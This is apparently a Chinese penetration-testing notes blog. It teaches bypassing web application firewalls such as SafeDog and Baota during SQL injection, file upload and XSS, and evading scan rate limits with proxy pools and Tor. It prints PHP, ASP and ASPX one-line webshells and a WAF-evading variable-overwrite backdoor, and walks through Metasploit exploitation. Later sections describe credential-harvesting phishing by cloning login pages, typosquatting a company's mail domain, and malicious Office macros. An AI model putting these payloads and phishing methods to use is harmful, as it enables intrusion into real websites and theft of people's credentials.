![在这里插入图片描述](https://img-blog.csdnimg.cn/20210716175129396.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

##### 安全狗

安全狗用的人也挺多的，但是他的防护效果不如其他防护软件好。因为历史悠久且免费所以使用的人多。绕过难度：简单
以下是安全狗默认开启和关闭的选项，按道理来说全部开启网站更安全，但是为了防止正常请求被错误拦截，这里是没有全部开启的
安全狗官方下载链接 https://www.safedog.cn/server_safedog.html
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210707231011334.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

##### 将会流行的WAF
人工智能WAF如openrasp

#### 市面上常见绕过工具

检查和绕过 WAF 的工具：
w3af — Web 应用程序攻击和审计框架

BypassWAF –通过滥用 DNS 历史绕过防火墙。此工具将搜索旧的 DNS A 记录并检查服务器是否回复该域。 

CloudFail – 是一种战术侦察工具，试图找到 Cloudflare WAF 背后的原始 IP 地址。

### 通用

#### 待补充：全扫描工具

**待补充如何伪造成用户，来骗过WAF指纹识别？**
对方开了WAF这些扫描工具通常会被识别拦截
AWVS:扫描速度开最低，设置付费代理（通杀），UA写爬虫

有时候采用这些工具也很费劲，比如它们被拦截了的可能是其探测语句，这时候你就只能多采用工具一起测试了

不支持延迟请求？
用burpsuite劫持，然后用按键精灵或模拟器控制速度或多工具联动扫描，将数据联动到可控制速度的。如三连动，awvs发送到burpsuite，再发送到xray上

#### 流量监控

**宝塔**
60秒内，请求同一URL超过120次，封锁IP 100秒。
60秒内，恶意请求6次，封IP 600秒。

##### 躲避

**方案1：延迟扫描**
一般设置3秒起，这会大大降低你的访问速度

**方案2：爬虫伪造**
如果对方对此设置了白名单就可以，一般会对搜索爬虫设置白名单的，默认也是。因为对方希望自己网站被搜索引擎收入
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210708204226690.png)
**方案3：代理池**
有时候WAF会识别代理.且市面上没有什么免费的好的代理，免费代理过期时间基本都短比如几秒样子，使用的人也很多。代理购买，通常买包天，隧道代理(请求一次隔段时间换一次IP）大概20rmb,做扫描的时候强烈推荐购买付费代理，其中一个购买网站是 https://www.kuaidaili.com/pricing/#tps
如果你使用代理，用burpsuite做二级代理才可以抓包


经济一点的方法是扫描时使用tor代理，几分钟会自动换ip，前提是你需要一个国外或香港的代理，不然是连接不上TOR匿名网络的，这比你本身的VPN更隐蔽，但速度慢。


 python代理请求关键代码

```c
requests.get(urls,headers=hearders,proxies=proxy)
```

##### 经验

阿里云：不能设置爬虫请求头，只能设置代理池或者延时3秒
BT：扫描字典不能有敏感文件如bak等，这就要用文件上传绕过策略了



### SQL绕过

宝塔：拦截方式/*

#### 默认未开启的防御绕过

##### sqlmap

如需sqlmap注入，修改us头，加入代理池防止CC拦截，自写Tamper脚本

```bash
# waf.py 是自己写的
sqlmap-proxy="http://127.0.0.1"--tamper="waf.py"--random-agent
```

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210716230027420.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

##### 手动

主要利用安全狗是整段语句检测的，而SQL是逐步执行的
**情况：目标网站允许接收其他请求方式；方法：post提交+敏感语句处理**
当安全狗拒绝你直接用 `id=1 and 1=1 `直接插入在url的get请求中,你试着将其用在post请求中图是因为加了database所以被墙了。

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210707234946157.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
这时候是可以绕过WAF的，但绕过不等于你注入成功。能否获得注入成功，取决于目标网站是否接受别的请求方式数据。如下图就只接受了GET。
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210708001152534.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
如果这种方式能绕过且数据能被接收，但你却不能进行下一步，因为在默认情况下安全狗禁止了一切数据库查询，连post请求方式也不行。
<font color="#dd00dd">执行敏感关键字：database()</font><br /> 
但是安全狗监测数据库的注入的方式是整体语句，举个例子，`database()`被防御，但是`database`或者`()`不被防御。因此你可以尝试用注释符号隔开
![在这里插入图片描述](https://img-blog.csdnimg.cn/202107080041210.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
<font color="#dd00dd">执行敏感关键字：union select </font><br /> 

%00截断   %23:#  A:单独字符串 #A：代表注释，干扰  %0A:换行符

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210708123824908.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

****

其他绕过补充：上面一个已经足够了，但是想试试别的方法可以看以下
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210708152942575.png)




**情况：只允许接收get数据包；方法：**
一般注入都是在get,安全狗对此就更多的使用防御。

### 文件上传绕过

#### 安全狗

**数据溢出-防匹配(xxx...)**
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210709180150666.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
**符号变异-防匹配`(' " ;)`**
如图上传时修改数据包使其不闭合，可以绕过WAF。WAF在识别时一直想找闭合，但却找不着。但是php却会自动处理这类文件。对于安全狗，去掉后面的引号可以成功，但是去掉前面的引号却会导致绕过失败。这是因为安全狗的识别机制![在这里插入图片描述](https://img-blog.csdnimg.cn/20210709201118607.png)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210709202310936.png)
或者你使用`;.php`分号使安全狗认为是语句结束了 
**数据截断-防匹配(换行)**
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210709180250295.png)
**重复数据-防匹配(参数多次)**
写了多次，服务器是以最后一位为主
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210709180311818.png)
安全狗误认为x.php没有对应的key,但是其实是写给了filename。上传后的文件是x.php
![在这里插入图片描述](https://img-blog.csdnimg.cn/2021070918032977.png)
上传后的文件是jpeg;x.php
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210709180333728.png)
斜杠也可以作为条件绕过
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210709180342299.png)

### xss 绕过

你在测试时你需要用好F12多监控对方网站到底做了哪些防御。![在这里插入图片描述](https://img-blog.csdnimg.cn/20210710195547722.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
单引号括起来后能防止对方的强制加上如h2之类的干扰
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210710200005339.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

标签语法替换
![在这里插入图片描述](https://img-blog.csdnimg.cn/2021071021435745.png)

特殊符号干扰
/ #
因爲/在js中代表语句的结束
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210710214005267.png)

提交方式更改
垃圾数据溢出
加密解密算法

* 采用此方法你应该查看目标网站可以加解密的方式

结合其他漏洞绕过

### 权限控制拦截
以下几种方式都可以轻松绕过防护软件，这些木马直接躺在本地服务器检测机制会比输入要小，比如输入不能有base64_decode.但是木马中却是支持的

**变量覆盖**

可以绕过安全狗、宝塔，但是还是现在WAF都有变量追踪了，如果不追踪输入参数，就可以绕过

```bash
# 访问是 x=b & y=assert
<?php
	$a = $_GET['x']		# $a=b
	$$a = $_GET['y']	# $b=assert
	# base64解码是为了提交post请求时一些如phpinfo的敏感词直接被栏
	$b(base64_decode($_POST['z']))		# assert($_POST['z'])
?>
```

**加密**
或用php加密 http://www.phpjm.net/，或冰蝎自带加密

**异或生成**



### 其他绕过总结

**base64被拦截**
这里主要说说怎么去考虑替换编码。因为你输入phpinfo是会报错的，通常在输入base64_decode也会被宝塔拦截。那么你就试试其他可逆编码方式？
或关键词替换、拼接、php变量套用。。

**文件包含路径**
文件包含：以上几种
..\    ..../     ..\.\等



# 经验积累

## 中间件
中间件即是一种独立的系统软件或服务程序，分布式应用软件借助这种软件在不同的技术之间共享资源。
### IIS
**介绍**
IIS是只适用于windows的中间件

**安装**
如何安装很简单，略。
但是值得多指出的一点是，这不想装编程语言版本随便切换，就目前的狀況來說，你要用 IIS 8 (非 Express) 就一定要升級到 Windows 8 以上才行，Windows 8.1 是 IIS 8.5，Windows 10 是 IIS 10，因為 IIS 和作業系統是整合的元件，它也沒有釋出可轉散布的安裝檔。

**待补充：漏洞**
PROPFIND 栈溢出漏洞
RCE CVE-2017-7269
PUT任意文件写入
### Apache
### Nginx
### tomcat

## CMS特性

![在这里插入图片描述](https://img-blog.csdnimg.cn/2021071520534055.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

知名的第三方工具网上是有专门的扫描器的，这相比于通用的扫描得会更及时更经常。如果没有你就想办法弄源码下来，弄到之后先采用一键代码设计软件进行扫描漏洞，扫描不出就去看看源码找0day

如果对方完全用框架去搭建的，那么它的安全验证/漏洞就会完全来自框架。如果是半开发的漏洞就通常采用常规测试

### 敏感信息搜集

**搜索引擎搜敏感词**
框架+爆破目录
框架+漏洞利用/拿shell
框架+弱口令

**github**
框架+历史漏洞 github
框架github看发布修复了哪些漏洞，就大概能对历史漏洞有全貌了解
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210718135824694.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
发现相关漏洞之后进入commit就知道这个漏洞到底发生在哪些语句
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210718140015986.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

### 工具
#### 利用

wordpress:wpscan(kali内置)
thinkphp:thinkphppayload

#### 弱口令

snetcraker:国内开发的，使用起来简单,但仅支持远程协议的爆破破解如mysql，redis等。如果是网页登录需要用burpsuit爆破提交数据包的
hydra:国外开发的，kali集成

### thinkphp5

![在这里插入图片描述](https://img-blog.csdnimg.cn/2021071812320635.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
启动界面如图所示  :）![在这里插入图片描述](https://img-blog.csdnimg.cn/20210718123314499.png)

#### 特性

**访问调用**
支持在url访问文件的函数，写法是url/文件名（如果是index.php可以省略不写）/目录
/类名（没有类可忽略）/函数名
支持在url访问文件的参数，写法是url/文件名/目录
/类名（没有类名可忽略）/函数名/参数名/1

以上方法定义的访问一般至少网页url层有3层。如果是定义路由route文件,重新自定义了访问，访问就更隐蔽了，如下是一个route.php文件的定义。
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210718132543794.png)


利用好上述特性，你在访问时就可以直接调用内在函数

**开启调试模式**
直接在config中就可以开启调试，这为审计提供了便利。一般在审计时通常会开启，开启方法很简单都以下两个值都设置为true
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210718130329347.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210718133002578.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

****

利用tp5的特性在代码审计时，应先查看route文件，再将调试打开，以最快的定位页面文件位置

#### 历史漏洞

tp5历史漏洞 https://github.com/Mochazz/ThinkPHP-Vuln


### dedecms

#### 基本信息

介绍市场份额、经典界面、漏洞、平台更新速度、版本差别

#### 敏感信息

**后台目录**
/dede
更多请看http://wap.dedexuexi.com/dedejiaocheng/azsy/1136.html


## 语言特性

### PHP



#### 变量覆盖漏洞

顾名思义，自定义的变量替换原有变量的情况称为变量覆盖漏洞

主要涉及的函数有以下四个：

```bash
extract() 
parse_str() 
import request variables() 
$$
```

如果GET的传参允许被变量，那么通常会配合文件包含或SQL注入拿到隐秘的东西。比如metinfo有类似的漏洞。

extract()函数导致的变量覆盖
extract()该函数使用数组键名作为变量名，使用数组键值作为变量值。针对数组中的每一个元素，将在当前符号表中创建对应的一个变量

parse_str函数导致的变量覆盖问题
parse_str()函数用于把查询字符串解析到变量中，如果没有array参数，则由该函数设置的变量
将覆盖已存在的变量名

import_request_variables()使用不当
import_request_variables将GET/POST/COOKIE变量导入到全局作用域中
import_request_variables()函数就是把GET、POST、COOKIE的参数注册成变量，用在register_globals被禁止的时候 

### JAVAWEB

更多请查看《攻击javaweb应用》

#### 与SQL注入有关的预编译

在SQL注入中java要比PHP漏洞少得多，因为其数据库查询通常会写成预编译。

**预编译**
一般JAVA中常见预编译，不过其他语言也是可以写出来的
使用PreparedStatement的参数化的查询可以阻止大部分的SQL注入。如下图当java定义接收的参数为？这就代表使用了预编译。注释的就是没有预编译的，通常就可能存在安全漏洞
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210718143651696.png)

在使用参数化查询的情况下，数据库系统不会将参数的内容视为SQL指令的一部分来处理，而是在数据库完成SQL指令的编译后，才套用参数运行，因此就算参数中含有破坏性的指令，也不会被数据库所运行。因为对于参数化查询来说，查询SQL语句的格式是已经规定好了的，需要查的数据也设置好了，缺的只是具体的那几个数据而已

case when带入SQL语句可以绕过，但这种只有对方服务器源代码有order by才能奏效。含有order by的网页一般都有排序功能。
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210714160336287.png)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210714160705489.png)

#### JSON WEB TOKEN

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210714150644539.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210714181545725.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

JWT产生在数据包中的数据验证里比如cookie中某参数。
一般你看到的就是加密后的JWT文件，如下：
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210714163343807.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
JWT分为头部(header)，声明(claims)，签名(signature)，三个部分以英文句号隔开。头部和声明会采用base64加密，签名加密与头部和声明都有关，还要进行整体的sha加密才可以得到最终值，加密方式如下图，对此的解密要用密匙才能解开。如果你还是困惑我表达的意思，你可以访问 https://jwt.io/ 输入一段JWT来交互加解密。
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210714180644797.png)

JWT攻击取决于对方服务器是接收数据来进行什么样的下一步操作，如果是身份验证那么你就可以做到越权，如果是取数据与SQL语句拼接，那么你就可以做到SQL注入...

#####  破解

**对方服务器允许签名为空**
将头部解密之后值改为none（改为none即不要密钥的意思），在进行编码成base64，声明值看你是否需要修改相应参数来确定是否修改，（一般会修改用户名和身份过期时间的时间戳），删除签名。如果你是GET请求的数据包你在修改时应充分考虑base64特殊字符 + = / 与url编码兼容问题。常见的base64传输的=应该删掉

**爆破密匙**
爆破方法是将常用字典一个个当做秘钥，每个秘钥对应着不同的签名，将生成的签名与真实签名进行比较

1、服务端根据用户登录状态，将用户信息加密到token中，返给客户端
2、客户端收到服务端返回的token，存储在cookie中
3、客户端和服务端每次通信都带上token，可以放在http请求头信息中，如：Authorization字段里面
4、服务端解密token，验证内容，完成相应逻辑



   JWT进行破解，对令牌数据进行破解





## 蜜罐
蜜罐技术本质上是一种对攻击方进 欺骗的技术，通过布置一些作为诱饵的主机、网络服务以及操作系统等，诱使攻击方对它们实施攻击，从而可以捕获攻击行为进行分析、溯源、反制等操作。

了解攻击方所使用的工具与方法，推测攻击意图和动机，能够让防御方清晰地了解他们所面对的安全威胁，并通过技术和管理手段来增强实际系统的安全防护能力。

蜜罐是企业内部私有的情报收集系统。通过对蜜罐本身的设定以及蜜饵的铺洒与运营引诱黑客前来攻击。所以攻击者触碰陷阱时，你就可以知道他是如何得逞的，随时了解针对服务器发动的最新的攻击和漏洞。还可以通过窃听攻击之间的联系，收集黑客所用的种种工具，最终掌握他们的攻击路径与手法，知己知彼。
****
比较知名的有：hfish
蜜罐项目汇总 https://github.com/paralax/awesome-honeypots/blob/master/README_CN.md


**防止掉入蜜罐**

匿名者需要额外小心，很多时候一不小心点了红队传送的URL，那么我们就很可能被JSONP蜜罐直接获取社交号或者被抓到真实的出口IP

**识别蜜罐**

**欺骗蜜罐**

当我们识别出蜜罐，有以下方式来做反攻：

>①投喂大量脏数据
>
>②伪造反向蜜罐，诱导红队进入并误导溯源并消耗红队的精力

## Webshell

一句话木马是最简单的webshell，基本实现思想是把后门数据包的东西当做恶意代码执行。但很多网站已经对一句话木马做防范了，因此通常这些木马要经过一定变形修改才上传，不然可能被封IP

asp一句话木马：

```bash
<%execute(request("value"))%>
```

php一句话木马：

```bash
<?php @eval($_POST['x'])?>
```

aspx一句话木马：

```bash
<%@ PageLanguage="Jscript"%>
<%eval(Request.Item["value"])%>
```


待补充：利用msfvenon生成木马、不死马




# 系统漏洞

![在这里插入图片描述](https://img-blog.csdnimg.cn/2021071422384836.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

## 工具

### 探测工具简介

**nmap**

namp --script=vuln 默认nse插件，扫描有局限，如果要用nmap扫描一般要用第三方比如vulscan或vulners。将国外知名的漏洞文件放在vulscan目录下，这些工具就会去自动识别读取漏洞，所以扫描就会全。具体怎么用，等我以后有空详解。
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210714232851858.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
占位符，未经详细测试nmap vulscan与 nessus性能差别。

**nessus**
点击新建项目后来到下面这个界面，在用一般会点的高级扫描
![在这里插入图片描述](https://img-blog.csdnimg.cn/2021071423333457.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210714234445162.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

### EXP工具

##### Metasploit

如果你是第一次使用这个工具，那么工具的可视化界面将对你更友好，更加熟悉msf目录结构。

```bash
# 初始化msfdb数据库。如果你不用这个命令直接执行可视化系统仍旧会指导你先进行初始化
msfdb initb
armitage
```

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210522014217527.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)


**基础使用方法**
msf
以smb为例

```bash
# 1. 启动msf
service postgresql start
msfconsole

# 2.搜索相关漏洞
search smb

# 3. 进入该漏洞列表
# show payloads可以查看需要设置哪些参数
use auxiliary/scanner/smb/smb_ms17_010

# 4.设置相关参数
# show options可以查看需要设置哪些参数
set RHOSTS 10.101.2.11

#5. 执行利用漏洞
run

#其他常见命令
# 查看当前系统
getuid
# 获取目标系统的shell
shell
```

因为metasploit出现使得成为一名黑客的门槛降低了，这款工具将渗透过程变得简单和自动化。当一个漏洞出来时，在metaspolit会更新，你将可以用此工具做漏洞验证，当数月后漏洞修复了，那么此工具会公开漏洞利用的脚本。
![ 啊啊啊啊](https://img-blog.csdnimg.cn/20210510222731371.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)




![在这里插入图片描述](https://img-blog.csdnimg.cn/20210510223458722.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210510225928292.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
**反弹**
用你如果要将msf用于实际外网（这里指非局域网）站点，需要做反弹于云服务器。
安装完msf之后确保你的云服务器能顺利执行msfconsole

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210720150351190.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)


## 字典
### 制作
**pydictor**
生成简单字典、社工字典、合并整理多个字典
项目地址：https://github.com/LandGrey/pydictor
使用：

```bash
git clone https://www.github.com/landgrey/pydictor.git
cd pydictor/
python pydictor.py 
# 查看社工字典
python pydictor.py –sedb 
# 合并去重
python pydictor.py -tool uniqbiner 你的字典文件夹
```
### fuzzy
国外fuzzy字典https://github.com/danielmiessler/SecLists/tree/master/Discovery/Web-Content
# APP漏洞

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210715204256707.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
APP-> WEB APP->其他 APP->逆向

## 抓包

 网站的框架被封装在APP中，因此你从网站下载的app入侵成功后很可能你同步拿下了网站的。以下方式获得的结果有很大的不同，你应该配合使用
 **获取信息方式1.burpsuite**
打开模拟器或者是你真实的在手机上进行操作，我打开了模拟器。
对wifi进行设置
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210625101333315.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
设置wifi与自己本机wifi相同
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210625101546129.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
手机抓包代理应该设置为本地真实ip而不是像抓网页端一样设置为127.0.0.1
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210625101919134.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

在burpsuite也做代理设置。burpsuite是一个专门抓web协议的数据流量软件。如果你在安卓模拟器随便打开一个app,当这个app涉及到请求网站时，这数据将会被抓取






 使用APP获取封装的网页，你需要利用好抓包工具burpsuite
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20210629214132940.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

 在抓到相应的http链接后，你很可能遇到的情况是当你直接利用浏览器去访问请求的http时，无法得到你用app返回的数据包，你用浏览器返回的数据包很可能是个报错如403等界面。这时候你需要仔细检查你用APP发送的数据包与你用web发送的数据包异同点，将你的web发送的请求直接改成APP发送的数据包

**获取信息方式2.逆向编译工具**
漏了个大洞，一键提取，且加了反编译  
下载 https://pan.baidu.com/s/1P3gW_En1SI7fXzuxvt5uCw
提取码：k5se
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210629212757948.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)


# 待补充：应急响应

# 社会工程学
社会工程学通常来说技术含量也不高，但有效。
## 以假乱真
### 站点伪造
我学这个网站钓鱼是参考这篇博客，如果你觉得我遗漏了一些细节，请参考这篇博客完成实验[网站钓鱼攻击，图文请看这篇博客](https://www.freebuf.com/articles/web/253320.html)

在set>提示符中输入1（Social-Engineering Attacks）并按下回车。
现在选择Website Attack Vectors（选项2）。
从下面的菜单中，我们选择Credential Harvester Attack Method（选项3）。
选择Site Cloner（选项2）。
它会询问IP address for the POST back in Harvester/Tabnabbing。它的意思是收集到的证书打算发送到哪个 IP。这里，我们输入 Kali 主机在vboxnet0中的 IP 192.168.56.1。
下面，压脚询问要克隆的 URL，我们会从 vulnerable_vm 中克隆 Peruggia 的登录表单。输入http://192.168.56.102/peruggia/index. php?action=login。
现在会开始克隆，之后你会被询问是否 SET 要开启 Apache 服务器，让我们这次选择Yes，输入y并按下回车。在这里你可能需要生成一个短链来混淆是非，短链生成网站有很多，随便推荐[一个](http://tool.chinaz.com/tools/dwz.aspx?qq-pf-to=pcqq.group)

你想做得更多的话：

 - 如果你使用网络攻击在复制完站点后，为达到更加真实效果，进入https://www.freenom.com/zh/index.html?lang=zh申请免费的域名。输入想要的名字默认三个月的使用时间，使用匿名电子邮箱（看我文章有介绍）验证登录
登陆阿里云，进入dns控制台添加域名，添加并配置好记录，然后进入云服务器管理控制台，点击实例名进入。Xshell连接服务器，开启http服务。
- 把所有图像和资源移到本地（而不是从被克隆的站点调用）



### 域名伪造
如果我们的目标公司有 mail.cyberspacekittens.com 这个域名，我们将购买 mailcyberspacekittens.com 这个域名，并设置一个假的 Outlook 页面来获取登录凭证。当受害者进入假网站并输入密码时，我们会收集这些数据并将其重定向到公司的有效电子邮件服务器（mail.cyberspacekittens.com）。这给受害者留下这样的印象：他们只是第一次意外地输错了密码，因此，再次输入正确密码并登录他们的帐户。

这种方法最巧妙地一点是你甚至不用做任何网络钓鱼的操作。因为有些人就是会打错域名或者手误漏掉 “mail” 和 “cyberspacekittens” 之间的点（.），然后进入了错误的网页并输入他们的登录凭证。我们会提示让受害者把我们的恶意网站添加为书签，这样可以让受害者每天都访问我们的恶意网页。
### who am i

友套近乎，“他是我一个之前某某某游戏认识的，您能给我一下他的微信吗，好久没跟他聊了”

通过搜索公司的QQ群、钉钉群,伪装成员工获取敏感截图和没被公知的网站

## 钓鱼
网络钓鱼的秘诀在于激发受害者的恐惧感或者紧迫感，有时也会向受害者描绘一些非常美好(甚至不太真实)的诱惑。
****
教育/培养机构
科研人员：技术交流
学生：挂科名单
老师：
****
公司
上班人士：绩效、薪酬、放假通知、惩罚通告、公司福利活动
管理人员：
销售：谈合作
hr:简历
****
其他出发点：
- 新闻。疫情？
- 购物
- 软件更新
- 恐吓。我已经获得了你的邮箱密码，点击链接打钱！

### 工具
以下工具选一
需求自动化选	http://getgophish.com/documentation/
你熟悉Ruby选	https://github.com/pentestgeek/phishing-frenzy
你熟悉python选	https://github.com/securestate/king-phisher
### 钓鱼手段
DLL劫持
假冒加固工具
木马捆绑
#### 宏 – Office
虽然是很老旧，但向受害者发送恶意的 Microsoft Office 文件仍然是久经考验的一种社会工程学攻击方法。那为什么 Office 文件非常适合作为恶意 payload 的载体呢？这是因为 Office 文件的默认设置是支持 VBA 代码所以允许 VBA 代码的代码执行。尽管最近这种方法已经很容易被杀毒软件检测到，但在经过混淆处理之后，在很多情况下仍然可以生效。


现在，每当有人打开你的文档时，他们都会收到安全警告并看到一个启用内容的按钮。 如果你可以诱导受害者点击“启用内容”的按钮，那么你的 PowerShell 脚本将会被执行，这会弹给你一个 Empire Shell 。

